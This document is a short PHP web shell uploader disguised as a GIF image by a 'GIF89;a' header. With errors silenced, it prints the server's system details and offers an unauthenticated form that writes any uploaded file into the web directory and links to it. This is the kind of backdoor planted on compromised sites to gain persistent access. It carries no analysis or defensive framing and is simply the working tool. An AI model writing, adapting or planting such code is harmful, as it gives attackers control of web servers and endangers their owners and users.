GIF89;a <?php
error_reporting(0);
$nama = $_FILES['file']['name'];
echo '<b>Et04 '.date('D, d M, Y H:m:s').'</br>';
echo ''.php_uname().'</br>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';	
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></b></form>';
if( $_POST['_upl'] == "Upload" ) 
{
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) 
{ 
	echo "<b>Upload Sukses : <i><a style='text-decoration: none' target=_blank href=".$nama.">$nama</a></i></b></i>";
}
else 
{
	echo "<b>Upload Gagal : <i>$nama</i></b></i>"; 
}
}
?>